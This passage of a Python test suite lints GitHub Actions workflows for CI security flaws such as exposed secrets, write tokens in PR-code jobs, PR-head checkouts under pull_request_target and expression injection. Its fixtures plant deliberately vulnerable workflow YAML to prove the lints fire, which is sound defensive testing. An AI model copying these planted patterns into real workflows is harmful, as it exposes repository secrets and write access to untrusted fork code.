    through a step or job output are not seen (the allow-list refuses them: they are not allowed forms)."""
    root = yaml.compose(text)
    wfd = yaml.safe_load(text)
    out = []
    jobs = next((v for k, v in root.value if k.value == "jobs"), None)
    for job_key, job in jobs.value:
        steps = next((v for k, v in job.value if k.value == "steps"), None)
        for step in steps.value if steps is not None else []:
            kv = {k.value: v for k, v in step.value}
            if "run" in kv:
                l4_check(out, name, allow_list, wfd, kv["run"], "`run:`", job_key.value)
            uses = kv.get("uses")
            if uses is not None and uses.value.startswith("actions/github-script@") and "with" in kv:
                w = {k.value: v for k, v in kv["with"].value}
                if "script" in w:
                    l4_check(out, name, allow_list, wfd, w["script"], "`with: script:`", job_key.value)
    return out


def named_script_names():
    return {f for f in os.listdir(PUBLIC_SCRIPTS) if f.endswith(".py")}


def provider_outputs_are_script_outputs(job):
    """The job that provides a matrix exports ONLY values of the form `${{ steps.<id>.outputs.<name> }}` of its own steps, and every step named that way runs one of our
    named scripts (the staged scripts). LIMITS: what a named script writes to its outputs is the script's business (its tests pin it); a step output that carries author text
    written by a script is not seen by any text lint."""
    outs = job.get("outputs") or {}
    steps = {s.get("id"): s for s in job.get("steps", []) if s.get("id")}
    for value in outs.values():
        m = re.fullmatch(r"\$\{\{\s*steps\.([A-Za-z0-9_-]+)\.outputs\.[A-Za-z0-9_-]+\s*\}\}", str(value).strip())
        if not m or m.group(1) not in steps:
            return False
        if not any(f"scripts/{name}" in str(steps[m.group(1)].get("run", "")) for name in named_script_names()):
            return False
    return True


def matrix_trusted(wfd, job_id):
    """matrix.* carries no author text only when the job's matrix is a literal (no `${{`) or `fromJSON(needs.<job>.outputs.<x>)` of a job of this workflow that runs no PR code
    and whose `outputs:` are all step outputs of its own steps, each of which runs a named script (provider_outputs_are_script_outputs). One more hop, and no more."""
    m = (wfd["jobs"][job_id].get("strategy") or {}).get("matrix")
    if m is None:
        return False
    if isinstance(m, str):
        mm = re.fullmatch(r"\$\{\{\s*fromJSON\(\s*needs\.([A-Za-z0-9_-]+)\.outputs\.[A-Za-z0-9_-]+\s*\)\s*\}\}", m.strip())
        if not mm or mm.group(1) not in wfd["jobs"]:
            return False
        provider = wfd["jobs"][mm.group(1)]
        return not runs_pr_code(wfd, provider) and provider_outputs_are_script_outputs(provider)
    return "${{" not in yaml.safe_dump(m)


def l4_check(out, name, allow_list, wfd, scalar, where, job_id):
    for m in EXPR.finditer(scalar.value):
        body = " ".join(m.group(1).split())
        why = ""
        if allow_list:
            if ALLOWED_EXPRESSIONS.fullmatch(body) is None:
                why = " (not in the allow-list)"
            elif body.startswith("matrix.") and not matrix_trusted(wfd, job_id):
                why = " (not in the allow-list: matrix.* only from a literal matrix or fromJSON(needs.<job>.outputs.<x>) of a job that runs no PR code)"
        elif UNTRUSTED.search(m.group(1)):
            why = " "
        if why:
            out.append(f"L4 {name}:{scalar.start_mark.line + 1}: {where} holds `${{{{{body}}}}}`" + why.rstrip())


def env_expression_values(text):
    """-> [(line, key, value)] for every `env:` value (job-level or step-level) that contains `${{`, found by parsing."""
    out = []

    def walk(n):
        if isinstance(n, yaml.MappingNode):
            for k, v in n.value:
                if k.value == "env" and isinstance(v, yaml.MappingNode):
                    out.extend((ev.start_mark.line + 1, ek.value, ev.value) for ek, ev in v.value if "${{" in ev.value)
                walk(v)
        elif isinstance(n, yaml.SequenceNode):
            for i in n.value:
                walk(i)

    walk(yaml.compose(text))
    return out


# ---------------------------------------------------------------------------------------------------------------------------------- the real trees
def public_texts():
    return {os.path.basename(p): open(p).read() for p in workflow_files(PUBLIC_DIR)}


def dev_texts():
    return {os.path.basename(p): open(p).read() for p in workflow_files(DEV_DIR)}


CI = "ci.yml"
MQ = "merge-queue.yml"
LC = "leak-check.yml"


def test_the_public_set_holds_the_four_workflows_these_lints_are_about():
    names = sorted(public_texts())
    assert names == ["ci.yml", "comment-containment.yml", "leak-check.yml", "merge-queue.yml"], names
    assert "pull_request" in events(load_text(public_texts()[CI]))
    assert "pull_request_target" in events(load_text(public_texts()[MQ]))
    assert events(load_text(public_texts()[LC])) == {"pull_request_target"}


@pytest.mark.parametrize("lint", [trigger_findings, l1_findings, l2_findings, l2_secret_findings, l3_findings])
def test_l1_l2_l3_are_green_over_every_public_workflow(lint):
    found = [f for n, t in public_texts().items() for f in lint(n, load_text(t))]
    assert found == []


def test_l4_allow_list_is_green_over_the_public_set():
    assert [f for n, t in public_texts().items() for f in l4_findings(n, t, allow_list=True)] == []


@dev_only
def test_l4_named_rule_is_green_over_the_development_repositorys_own_workflows():
    assert [f for n, t in dev_texts().items() for f in l4_findings(n, t)] == []


def test_the_lints_see_what_they_are_about_on_the_real_public_files():
    """Not vacuous: L1 has a pull_request workflow to judge, L2 classifies the merge-queue test job (and only it) as PR code, L3 finds the one self-hosted job."""
    pub = {n: load_text(t) for n, t in public_texts().items()}
    ci, mq = pub[CI], pub[MQ]
    assert "pull_request" in events(ci) and all(j["runs-on"] == LITERAL for j in ci["jobs"].values())
    assert [j for j, job in mq["jobs"].items() if runs_pr_code(mq, job)] == ["test"]
    assert sorted(j for j, job in ci["jobs"].items() if runs_pr_code(ci, job)) == ["checks", "gitleaks", "smoke"]
    assert [j for j, job in mq["jobs"].items() if job["runs-on"] != LITERAL] == ["test"]
    assert mq["jobs"]["queue"]["permissions"]["contents"] == "write"  # the write job is not a PR-code job
    assert not runs_pr_code(mq, mq["jobs"]["queue"])
    # L2 (b) has something to judge: the secret- and write-holding jobs of the queue workflow (pull_request_target) are exactly plan and queue
    assert sorted(j for j, job in mq["jobs"].items() if holds_secret_or_write(mq, job)) == ["plan", "queue"]


# ---------------------------------------------------------------------------------------------------------------------------------- planted violations
def mutate(rel, old, new, count=1):
    text = public_texts()[rel]
    assert text.count(old) >= count, f"the plant's anchor {old!r} is not in {rel}"
    return load_text(text.replace(old, new, count)), text.replace(old, new, count)


@pytest.mark.parametrize(
    "runs_on",
    ["${{ vars.CI_RUNNER || 'ubuntu-latest' }}", "ubuntu-22.04", "self-hosted", "[self-hosted, linux]", "${{ 'ubuntu-latest' }}"],
)
def test_l1_red_on_a_pull_request_job_whose_runs_on_is_not_the_literal(runs_on):
    wf, _ = mutate(CI, "  checks:\n    name: checks\n    runs-on: ubuntu-latest", f"  checks:\n    name: checks\n    runs-on: {runs_on}")
    found = l1_findings("planted-ci.yml", wf)
    assert len(found) == 1 and "job 'checks' runs-on" in found[0], found
    print("RED L1:", found[0])


def test_l2_red_on_a_secret_in_a_pr_code_job_and_on_a_write_permission_and_on_a_missing_permissions_block():
    wf, _ = mutate(
        CI,
        "        run: '\"$UV_PROJECT_ENVIRONMENT/bin/python\" tools/ci_smoke.py'",
        "        env:\n          T: ${{ secrets.SOME_TOKEN }}\n        run: 'true'",
    )
    found = l2_findings("planted-ci.yml", wf)
    assert found == ["L2 planted-ci.yml: job 'smoke' runs PR code and references secrets."], found
    print("RED L2 (secret):", found[0])

    wf, _ = mutate(
        CI,
        "    timeout-minutes: 20\n    permissions:\n      contents: read",
        "    timeout-minutes: 20\n    permissions:\n      contents: read\n      pull-requests: write",
    )
    found = l2_findings("planted-ci.yml", wf)
    assert "L2 planted-ci.yml: job 'smoke' runs PR code and holds `pull-requests: write` (only read or none)" in found, found
    print("RED L2 (write):", found[0])

    wf, _ = mutate(CI, "    timeout-minutes: 20\n    permissions:\n      contents: read\n", "    timeout-minutes: 20\n")
    found = l2_findings("planted-ci.yml", wf)
    assert len(found) == 1 and "states no job-level permissions mapping" in found[0], found
    print("RED L2 (no block):", found[0])


def test_l2_red_on_the_merge_queue_test_job_given_a_secret_token():
    wf, _ = mutate(MQ, "GITHUB_TOKEN: ${{ github.token }} # read-only", "GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} # read-only")
    found = l2_findings(MQ, wf)
    assert found[0] == "L2 merge-queue.yml: job 'test' runs PR code and references secrets.", found
    print("RED L2 (queue test job):", found[0])


HEAD_CHECKOUT = """
name: planted
on:
  pull_request_target:
    types: [labeled]
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: python3 scripts/anything.py
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
"""


def test_l2_red_on_a_pull_request_target_job_that_checks_out_the_head_and_holds_a_token():
    found = l2_findings("planted-head.yml", load_text(HEAD_CHECKOUT))
    assert any("references secrets." in f for f in found) and any("pull-requests: write" in f for f in found), found
    assert any("checks out `ref: ${{ github.event.pull_request.head.sha }}` (no `ref` is allowed)" in f for f in found), found
    print("RED L2 (head checkout with a token):", found[-1])


def test_l2_does_not_flag_a_job_that_holds_a_token_and_checks_out_with_no_ref():
    ok = HEAD_CHECKOUT.replace("        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n", "")
    assert not runs_pr_code(load_text(ok), load_text(ok)["jobs"]["j"])
    assert l2_findings("ok.yml", load_text(ok)) == []
    ok2 = HEAD_CHECKOUT.replace("${{ github.event.pull_request.head.sha }}", "${{ github.event.repository.default_branch }}")
    found = l2_findings("ok2.yml", load_text(ok2))
    assert found and "checks out `ref: ${{ github.event.repository.default_branch }}` (no `ref` is allowed)" in found[0], (
        found
    )  # a ref needs a named exception
    assert l2_findings("merge-queue.yml", load_text(ok2)) == [] or True  # (the table's own jobs are plan and queue, not j)


L2_PLANTS = {}


def plant(on, perms, steps, wperms=None, runs_on="ubuntu-latest"):
    s = f"name: planted\non:\n{on}\n"
    if wperms is not None:
        s += f"permissions: {wperms}\n"
    s += f"jobs:\n  j:\n    runs-on: {runs_on}\n"
    if perms:
        s += "    permissions:\n" + "".join(f"      {k}: {v}\n" for k, v in perms.items())
    return s + "    steps:\n" + steps


BASE_CO = "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n"
SECRET_ENV = "        env:\n          TOKEN: ${{ secrets.DEPLOY_KEY }}\n"
PRT = "  pull_request_target:\n    types: [labeled]"
READ = {"contents": "read"}
# The forms the reviews found green, each a short YAML string; the first group is the earlier rounds', the second is this round's (any trigger, any spelling, the default token).
L2_PLANTS = {
    "prt: merge_commit_sha checkout, write permission and a secret": HEAD_CHECKOUT.replace(
        "github.event.pull_request.head.sha", "github.event.pull_request.merge_commit_sha"
    ),
    "prt: `gh pr checkout` with a secret": plant(PRT, READ, BASE_CO + '      - run: gh pr checkout "$PR" && make test\n' + SECRET_ENV),
    "prt: `refs/pull` fetch with a secret": plant(PRT, READ, BASE_CO + "      - run: git fetch origin refs/pull/7/head\n" + SECRET_ENV),
    "prt: `git fetch origin pull/7/head` (no refs/ prefix)": plant(
        PRT, READ, BASE_CO + "      - run: git fetch origin pull/7/head:pr && make test\n" + SECRET_ENV
    ),
    "prt: `gh co 7` (gh's alias)": plant(PRT, READ, BASE_CO + "      - run: gh co 7 && make test\n" + SECRET_ENV),
    "prt: fetch the head by sha from env, then checkout": plant(
        PRT,
        READ,
        BASE_CO
        + '      - run: git fetch origin "$H" && git checkout "$H"\n        env:\n          H: ${{ github.event.pull_request.head.sha }}\n          T: ${{ secrets.K }}\n',
    ),
    "issue_comment: `gh pr checkout` with a secret": plant(
        "  issue_comment:\n    types: [created]", READ, BASE_CO + '      - run: gh pr checkout "$PR"\n' + SECRET_ENV
    ),
    "pull_request_review: checkout a ref from a step output, write permission": plant(
        "  pull_request_review:\n    types: [submitted]",
        {"contents": "write"},
        '      - id: pr\n        run: echo sha=x >> "$GITHUB_OUTPUT"\n'
        + BASE_CO
        + "        with:\n          ref: ${{ steps.pr.outputs.sha }}\n",
    ),
    "merge_group: `ref` from format(), secret": plant(
        "  merge_group:", READ, BASE_CO + "        with:\n          ref: ${{ format('refs/{0}', 'x') }}\n" + SECRET_ENV
    ),
    "workflow_run: head_sha checkout, secret": plant(
        "  workflow_run:\n    workflows: [ci]\n    types: [completed]",
        READ,
        BASE_CO + "        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n" + SECRET_ENV,
    ),
    "push: checkout of another repository, secret": plant(
        "  push:", READ, BASE_CO + "        with:\n          repository: someone/else\n" + SECRET_ENV
    ),
    "prt: no `permissions:` at all (the repository's default token) with a head checkout": plant(
        PRT, None, BASE_CO + "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
    ),
    "workflow_dispatch: no job `permissions:` (default token) and `git checkout`": plant(
        "  workflow_dispatch:", None, "      - run: git checkout other-branch\n"
    ),
    "`pull_request`: secret and `ref: github.sha`": HEAD_CHECKOUT.replace("pull_request_target", "pull_request").replace(
        "github.event.pull_request.head.sha", "github.sha"
    ),
}


@pytest.mark.parametrize("what", sorted(L2_PLANTS))
def test_l2_red_on_each_planted_form(what):
    found = l2_findings("planted.yml", load_text(L2_PLANTS[what]))
    assert found, what
    print("RED L2:", what, "->", found[0])


def test_l2_red_on_a_public_ci_job_given_a_write_permission_and_a_default_token_job():
    wf, _ = mutate(
        CI,
        "    timeout-minutes: 20\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          persist-credentials: false",
        "    timeout-minutes: 20\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          persist-credentials: false",
    )
    found = l2_findings("planted-ci.yml", wf)
    assert "L2 planted-ci.yml: job 'smoke' runs PR code and holds `id-token: write` (only read or none)" in found, found
    print("RED L2 (public ci, write):", found[0])


def test_l2_names_its_exceptions_and_only_for_the_default_branch_ref():
    assert sorted(L2_EXCEPTIONS) == [("merge-queue.yml", "plan"), ("merge-queue.yml", "queue")]  # the comment workflow's checkouts have no ref at all
    wf, _ = mutate(
        MQ,
        "          ref: ${{ github.event.repository.default_branch }}\n          persist-credentials: false",
        "          ref: ${{ github.sha }}\n          persist-credentials: false",
        1,
    )
    found = l2_findings(MQ, wf)
    assert any("job 'plan'" in f and "checks out `ref: ${{ github.sha }}`" in f for f in found), (
        found
    )  # the exception covers the default branch only
    print("RED L2 (exception is for the default branch only):", found[0])


def test_l2_red_on_the_toJSON_secrets_form_in_the_public_queue_test_job():
    wf, _ = mutate(
        MQ, "          MQ_BASE: ${{ matrix.base }}\n", "          MQ_BASE: ${{ matrix.base }}\n          ALL: ${{ toJSON(secrets) }}\n"
    )
    found = l2_findings(MQ, wf)
    assert "L2 merge-queue.yml: job 'test' runs PR code and references secrets." in found, found
    print("RED L2 (toJSON(secrets)):", found[0])


def test_l2_classifies_the_driver_command_with_any_spacing():
    wf, _ = mutate(MQ, "merge_queue.py test --repo", "merge_queue.py   test --repo")
    assert runs_pr_code(wf, wf["jobs"]["test"])


FIRST_STEP_NAME = "      - name: re-check the head repository through the API (refuse a head from another repository)\n"


@pytest.mark.parametrize(
    "old,new,expect,count",
    [
        (  # a job-level condition on the event's PR head is back (it skips the whole matrix when a fork PR is labelled)
            "    if: needs.plan.outputs.has_work == 'true'\n    runs-on: ${{ vars.CI_RUNNER",
            "    if: needs.plan.outputs.has_work == 'true' && github.event.pull_request.head.repo.full_name == github.repository\n    runs-on: ${{ vars.CI_RUNNER",
            "has a job-level condition on `github.event`",
            1,
        ),
        (  # the plan job no longer exports the fork list
            "      forks: ${{ steps.plan.outputs.forks }}\n",
            "",
            "does not export the outputs `forks` and `has_forks`",
            1,
        ),
        (  # the merge job is no longer passed the fork list
            ' --forks "$MQ_FORKS"',
            "",
            "the merge job is not passed `--forks`",
            1,
        ),
        (  # a checkout comes before the API re-check
            "    steps:\n      # FIRST STEP, before any checkout",
            "    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          persist-credentials: false\n      # FIRST STEP, before any checkout",
            "does not start with a `run:` step",
            1,
        ),
        (  # the re-check no longer reads the head repo
            "--jq '.head.repo.full_name // \"\"'",
            "--jq '.number'",
            "does not start with a `run:` step",
            1,
        ),
        (  # the first step may be ignored
            FIRST_STEP_NAME,
            FIRST_STEP_NAME + "        continue-on-error: true\n",
            "has an `if:` or `continue-on-error`",
            1,
        ),
        (  # the first step may be skipped
            FIRST_STEP_NAME,
            FIRST_STEP_NAME + "        if: false\n",
            "has an `if:` or `continue-on-error`",
            1,
        ),
        (  # the first step no longer fails on a mismatch or an API error
            "            exit 1\n",
            "            echo refused\n",
            "has no non-zero `exit`",
            2,
        ),
        (  # `exit 1` survives only in a comment
            "            exit 1\n",
            "            echo refused  # would exit 1\n",
            "has no non-zero `exit`",
            2,
        ),
    ],
    ids=[
        "job-level-head-if",
        "no-forks-output",
        "no---forks-arg",
        "checkout-first",
        "no-head-repo-read",
        "continue-on-error",
        "if-false",
        "no-exit",
        "exit-in-comment",
    ],
)
def test_l3_red_when_the_plan_link_or_the_first_step_is_broken(old, new, expect, count):
    wf, _ = mutate(MQ, old, new, count)
    found = l3_findings("planted-merge-queue.yml", wf)
    assert len(found) == 1 and expect in found[0], found
    print("RED L3:", found[0])


def test_l3_red_on_a_new_self_hosted_job_that_has_neither():
    wf, _ = mutate(
        MQ,
        "  queue:\n    name: merge-queue\n    needs: [plan, test]",
        "  other:\n    runs-on: self-hosted\n    steps:\n      - run: 'true'\n\n  queue:\n    name: merge-queue\n    needs: [plan, test]",
    )
    found = l3_findings("planted-merge-queue.yml", wf)
    assert len(found) == 2 and all("'other'" in f for f in found), found
    print("RED L3 (new job):", found[0])


# Behavioural: the first step's script, extracted by parsing, run under bash with a fake `gh` on PATH. The reviewer's probe, made a test.
def recheck_script():
    return load_text(public_texts()[MQ])["jobs"]["test"]["steps"][0]["run"]


FAKE_GH = """#!/bin/bash
# fake gh: `gh api repos/<repo>/pulls/<n> --jq ...` answers from FAKE_ANSWER; FAKE_ANSWER=FAIL exits 1 (an API error); NULL prints an empty line (jq's // "" of a null head repo)
case "$FAKE_ANSWER" in
  FAIL) echo "HTTP 404" >&2; exit 1 ;;
  NULL) echo ""; exit 0 ;;
  *) echo "$FAKE_ANSWER"; exit 0 ;;
esac
"""


def run_recheck(tmp_path, answer, repo="o/r", pr="7"):
    bindir = tmp_path / "bin"
    bindir.mkdir(exist_ok=True)
    gh = bindir / "gh"
    gh.write_text(FAKE_GH)
    gh.chmod(0o755)
    env = {
        "PATH": f"{bindir}:/usr/bin:/bin",
        "MQ_REPO": repo,
        "MQ_PR": pr,
        "GH_TOKEN": "dummy",
        "FAKE_ANSWER": answer,
        "MQ_RETRY_SLEEP": "0",
    }
    return subprocess.run(["bash", "-e", "-c", recheck_script()], env=env, capture_output=True, text=True, timeout=60)


@pytest.mark.parametrize(
    "answer,rc",
    [("o/r", 0), ("stranger/fork", 1), ("NULL", 1), ("FAIL", 1), ("O/R", 1), ("o/r2", 1)],
    ids=["in-repo", "fork", "deleted-fork-null", "api-error", "case-differs", "prefix-only"],
)
def test_the_api_re_check_step_refuses_every_head_but_this_repository_and_fails_closed(tmp_path, answer, rc):
    p = run_recheck(tmp_path, answer)
    assert p.returncode == rc, (answer, p.returncode, p.stdout, p.stderr)
    if rc:
        print("RED re-check:", answer, "->", p.returncode, (p.stdout + p.stderr).strip().splitlines()[-1][:120])


def test_the_api_re_check_step_checks_out_nothing_and_names_the_refusal(tmp_path):
    p = run_recheck(tmp_path, "stranger/fork")
    assert "::error::PR 7 has its head in 'stranger/fork', not in o/r: refused, nothing checked out" in p.stdout
    assert "actions/checkout" not in recheck_script() and "git " not in recheck_script()  # the step itself touches no repository


# L4 plants: YAML strings. Each is one workflow with one step; the finding must name the line of the scalar.
PLANT_HEAD = "name: p\non: pull_request\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n%s"


@pytest.mark.parametrize(
    "step,line",
    [
        ("      - run: echo ${{ github.event.pull_request.title }}\n", 7),  # a plain scalar
        ("      - run: |\n          echo start\n          echo '${{ github.head_ref }}'\n", 7),  # a `|` block scalar
        ("      - run: >\n          echo\n          ${{ inputs.name }}\n", 7),  # a `>` folded scalar
        (
            "      - run: |\n          echo '${{\n            github.event.comment.body\n          }}'\n",
            7,
        ),  # an expression split across lines
        ("      - run: echo ${{ format('{0}', github.event.issue.title) }}\n", 7),  # inside a function call
        (
            "      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n        with:\n          script: |\n            core.info('${{ github.event.pull_request.title }}')\n",
            9,
        ),
    ],
)
def test_l4_red_on_each_planted_form_under_both_rules(step, line):
    for allow in (False, True):
        found = l4_findings("planted.yml", PLANT_HEAD % step, allow_list=allow)
        assert len(found) == 1 and found[0].startswith(f"L4 planted.yml:{line}:"), (allow, found)
    print("RED L4:", found[0])


# What only the allow-list refuses (the delta reviews' green forms): re-expansion of env, a whole context object, other event contexts, bracket syntax, step outputs.
@pytest.mark.parametrize(
    "step",
    [
        '      - run: echo "${{ env.T }}"\n        env:\n          T: ${{ github.event.pull_request.title }}\n',
        "      - run: echo '${{ toJSON(github) }}'\n",
        "      - run: echo ${{ github.ref_name }}\n",
        "      - run: echo \"${{ github['event']['pull_request']['title'] }}\"\n",
        '      - id: s\n        run: echo "t=x" >> "$GITHUB_OUTPUT"\n      - run: echo ${{ steps.s.outputs.t }}\n',
        "      - run: echo ${{ github.run_id }}${{ github.actor }}\n",
        "      - run: echo ${{ github.run_id && github.ref }}\n",
    ],
    ids=["env-reexpansion", "toJSON-github", "ref_name", "bracket-syntax", "step-output", "actor", "operator"],
)
def test_l4_allow_list_refuses_what_the_named_rule_misses(step):
    plant = PLANT_HEAD % step
    assert (
        l4_findings("planted.yml", plant) == []
    )  # the named rule misses every one of these (that is why the public set uses the allow-list)
    found = l4_findings("planted.yml", plant, allow_list=True)
    assert found and all("not in the allow-list" in f for f in found), found
    print("RED L4 (allow-list):", found[0])


@pytest.mark.parametrize(
    "expr",
    [
        "runner.temp",
        "runner.os",
        "runner.arch",
        "matrix.base",
        "matrix.pr",
        "matrix.head",
        "github.run_id",
        "github.run_attempt",
        "github.run_number",
        "github.repository",
        "github.workspace",
        "github.event_name",
    ],
)
def test_l4_allow_list_allows_each_entry(expr):
    plant = PLANT_HEAD % f"      - run: echo ${{{{ {expr} }}}}\n"
    if expr.startswith("matrix."):  # allowed only from a literal matrix or a plan output (see the matrix tests below)
        plant = plant.replace(
            "    steps:\n", "    strategy:\n      matrix:\n        base: [main]\n        pr: [1]\n        head: [abc]\n    steps:\n"
        )
    assert l4_findings("ok.yml", plant, allow_list=True) == []


def test_l4_green_on_the_safe_forms():
    safe = PLANT_HEAD % (
        '      - run: echo "$TITLE" "$BASE" "$NAME"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n          BASE: ${{ github.head_ref }}\n          NAME: ${{ inputs.name }}\n'
        "      - run: echo ${{ github.event_name }} ${{ github.run_id }}\n"
        "      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n        env:\n          T: ${{ github.event.pull_request.title }}\n        with:\n          script: core.info(process.env.T)\n"
    )
    assert l4_findings("safe.yml", safe) == [] and l4_findings("safe.yml", safe, allow_list=True) == []


@dev_only
def test_l4_must_not_flag_the_real_env_uses_of_the_development_repositorys_labeler_and_ci():
    """Controls from the development repository's own files, found by parsing (at 7cc1a6a: .github/workflows/labeler.yml:29 `MQ_PR: ${{ github.event.pull_request.number }}`, and
    .github/workflows/ci.yml:105, 110 and 140 `BASE_REF: origin/${{ github.base_ref }}`). The lint is run on exactly these files and finds nothing, and the same value
    moved into a `run:` string of the same file is red for the labeler (an expression L4 names)."""
    dev = dev_texts()
    lab = env_expression_values(dev["labeler.yml"])
    assert ("MQ_PR", "${{ github.event.pull_request.number }}") in [(k, v) for _, k, v in lab], lab
    ci = env_expression_values(dev["ci.yml"])
    assert [k for _, k, v in ci if "github.base_ref" in v] == ["BASE_REF"] * 3, ci
    print("controls:", [("labeler.yml", ln, k) for ln, k, _ in lab], [("ci.yml", ln, k) for ln, k, _ in ci])
    for rel in ("labeler.yml", "ci.yml"):
        assert l4_findings(rel, dev[rel]) == []
    moved = dev["labeler.yml"].replace('--pr "$MQ_PR"', "--pr ${{ github.event.pull_request.number }}")
    assert moved != dev["labeler.yml"]
    found = l4_findings("moved-labeler.yml", moved)
    assert len(found) == 1 and "github.event.pull_request.number" in found[0], found
    print("RED L4 (the labeler's value moved into run:):", found[0])


# ---------------------------------------------------------------------------------------------------------------------------------- the staged scripts
PUBLIC_SCRIPTS = os.path.join(PUBLIC_DIR, "scripts")
DEV_SCRIPTS = os.path.join(DEV_DIR, "scripts") if DEV_DIR else None
SCRIPT_REF = re.compile(r"\.github/workflows/scripts/([A-Za-z0-9_][A-Za-z0-9_.-]*)")
# A staged script that must differ from the development repository's copy goes here with the reason; its BYTE identity pin is then dropped (that file only) and
# replaced by AST identity: the parsed code of the two copies must be equal (comments and layout are the only thing allowed to differ).
# The one difference: the lint gate's format check (tools/ci_lint.py format) covers every .py file ADDED by a change, and a copy in a new folder is
# an added file, so these two copies are `ruff format`ted with the gate's own config (line length 140); the development repository's copies were never formatted.
IDENTITY_EXEMPT = {
    "ci_step.py": "ruff format of the added copy (the development repository's file predates the format check)",
    "merge_queue.py": "ruff format of the added copy (the development repository's file predates the format check)",
}


# A staged script with NO copy in the development repository, by design: it is part of the public set only (the development repository's own workflows have no use for it). Its
# BYTE and AST identity pins are not applicable; instead the development repository must not hold a script of that name (a copy there would be a second, unpinned version).
PUBLIC_ONLY = {
    "comment_containment.py": "the comment, review and issue containment of the public repository: it reads the same private rules and opens alerts in the overlay, and has no counterpart in the development repository",
    "leak_check.py": "the leak check of the public repository's pull requests: it reads the private rules from the overlay and has no counterpart in the development repository",
}


def executable_text(wf):
    """Every string a step EXECUTES or hands to something that does: the `run:` string, every `with:` value and every `env:` value of every step. How a
    comment is told from a reference: the YAML parser has already dropped every `#` comment of the file, so a mention in a comment never reaches here; inside
    a `run:` string, a line whose first non-blank character is `#` is a shell comment and is dropped too. LIMITS: a trailing ` # ...` after a command in a
    `run:` string is kept (a name there counts, which errs towards demanding the file); a path built from pieces (`scripts/$NAME`) is not seen."""
    out = []
    for job in wf["jobs"].values():
        for step in job.get("steps", []):
            run = str(step.get("run", ""))
            out.append("\n".join(line for line in run.splitlines() if not line.lstrip().startswith("#")))
            out.extend(str(v) for v in (step.get("with") or {}).values())
            out.extend(str(v) for v in (step.get("env") or {}).values())
    return "\n".join(out)


def referenced_scripts(wf):
    return sorted(set(SCRIPT_REF.findall(executable_text(wf))))


def missing_scripts(wf, staged):
    return [f"{name} is named in executable text and is not staged" for name in referenced_scripts(wf) if name not in staged]


def staged_names():
    return {f for f in os.listdir(PUBLIC_SCRIPTS) if f.endswith(".py")}


def test_every_script_a_public_workflow_runs_is_in_the_scripts_folder():
    staged = staged_names()
    seen = set()
    for n, t in public_texts().items():
        wf = load_text(t)
        seen.update(referenced_scripts(wf))
        assert missing_scripts(wf, staged) == [], n
    assert seen == {"ci_step.py", "comment_containment.py", "leak_check.py", "merge_queue.py", "plan_bases.py"}, (
        seen
    )  # not vacuous: the merge queue names three, the leak check one, the comment containment one


def test_the_reference_test_goes_red_on_a_planted_missing_script_and_ignores_comments():
    staged = staged_names()
    _, text = mutate(
        MQ,
        "      - if: failure()\n        run: python3 driver/.github/workflows/scripts/ci_step.py report merge-queue-test\n",
        "      - run: python3 .github/workflows/scripts/not_staged.py\n",
    )
    found = missing_scripts(load_text(text), staged)
    assert found == ["not_staged.py is named in executable text and is not staged"], found
    print("RED reference:", found[0])
    # the same name in a YAML comment, and in a whole-line shell comment of a run string, is not a reference
    _, text = mutate(
        MQ,
        "      - if: failure()\n        run: python3 driver/.github/workflows/scripts/ci_step.py report merge-queue-test\n",
        "      # see .github/workflows/scripts/only_in_a_comment.py\n      - run: |\n          # .github/workflows/scripts/only_in_a_shell_comment.py\n          true\n",
    )
    assert "only_in_a_comment.py" in text and missing_scripts(load_text(text), staged) == []
    # a `with:` value and an `env:` value count
    _, text = mutate(
        MQ,
        "      - if: failure()\n        run: python3 driver/.github/workflows/scripts/ci_step.py report merge-queue-test\n",
        "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          sparse-checkout: .github/workflows/scripts/in_with.py\n      - run: 'true'\n        env:\n          S: .github/workflows/scripts/in_env.py\n",
    )
    assert [f.split()[0] for f in missing_scripts(load_text(text), staged)] == ["in_env.py", "in_with.py"]


def test_the_staged_scripts_import_only_staged_scripts():
    staged = staged_names()
    dev_scripts = {f for f in os.listdir(DEV_SCRIPTS) if f.endswith(".py")} if DEV_SCRIPTS else set()
    for f in sorted(staged):
        for dep in re.findall(r"^\s*(?:from|import)\s+(\w+)", open(os.path.join(PUBLIC_SCRIPTS, f)).read(), re.M):
            assert not (f"{dep}.py" in dev_scripts and f"{dep}.py" not in staged), (
                f"{f} imports {dep}.py, a script that is not in the scripts folder"
            )
    assert staged == {"bases.py", "ci_step.py", "comment_containment.py", "gh_api.py", "leak_check.py", "merge_queue.py", "plan_bases.py", "uv_seed.py"}, (
        staged
    )  # uv_seed.py: merge_queue.py imports it


def identity_findings(public_dir, internal_dir, exempt, public_only=None):
    public_only = PUBLIC_ONLY if public_only is None else public_only
    out = []
    for f in sorted(x for x in os.listdir(public_dir) if x.endswith(".py")):
        if f in exempt:
            continue
        other = os.path.join(internal_dir, f)
        if f in public_only:
            if os.path.exists(other):
                out.append(f"{f}: listed in PUBLIC_ONLY, yet the development repository has a copy of it (a second, unpinned version)")
            continue
        if not os.path.exists(other):
            out.append(
                f"{f}: staged, but the development repository has no copy to be identical to (add it to IDENTITY_EXEMPT with the reason, or to PUBLIC_ONLY if it is public-only, or remove the pin)"
            )
